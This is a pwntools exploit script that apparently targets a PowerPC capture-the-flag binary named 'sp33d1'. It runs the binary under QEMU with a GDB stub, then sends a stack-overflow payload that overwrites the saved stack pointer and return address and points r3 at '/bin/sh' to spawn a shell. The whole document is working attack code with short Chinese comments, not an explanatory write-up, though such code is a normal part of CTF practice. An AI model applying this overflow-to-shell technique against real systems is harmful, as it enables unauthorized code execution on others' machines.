from pwn import *
import time

context.arch = 'powerpc'
#context.log_level = 'debug'

# First, close any existing processes using port 1234
os.system('pkill -f "qemu-ppc -g 1234"')

# Start QEMU with GDB server explicitly
cmd = ['qemu-ppc', '-g', '1234', './sp33d1']
p = process(cmd)

#p = remote("sp33d.play.hfsc.tf", 20020)
print("QEMU started with GDB server on port 1234")
print("Now open another terminal and run:")
print("gdb-multiarch -q")
print("(gdb) set architecture powerpc")
print("(gdb) target remote localhost:1234")
print("(gdb) break main")
print("(gdb) continue")
print("Then press Enter in this terminal when you're ready to send input")

input("Press Enter when GDB is properly connected...")

p.recvuntil(b"pwn: ")

# Use the existing /bin/sh string at 0x10077a8c
payload = b"A" * 20 + b"\x10\x0b\xef\x20" # 控制栈顶 (control the top of stack)
payload += b"\xde\xad\xbe\xef" + b"\x10\x00\x06\x10" # 控制返回地址  (control return address)
payload += b"\x40\x7f\xfd\x8c" # 控制$r3，指向"/bin/sh" (control r3, point to "/bin/sh")
payload += b"/bin/sh" + b"\00"*9 
payload += b"\x10\x00\x06\x34" + b"\x40\x7f\xfb\x60" + b"\x10\x00\x08\x04" # 维护原本栈帧

p.sendline(payload)


p.interactive()
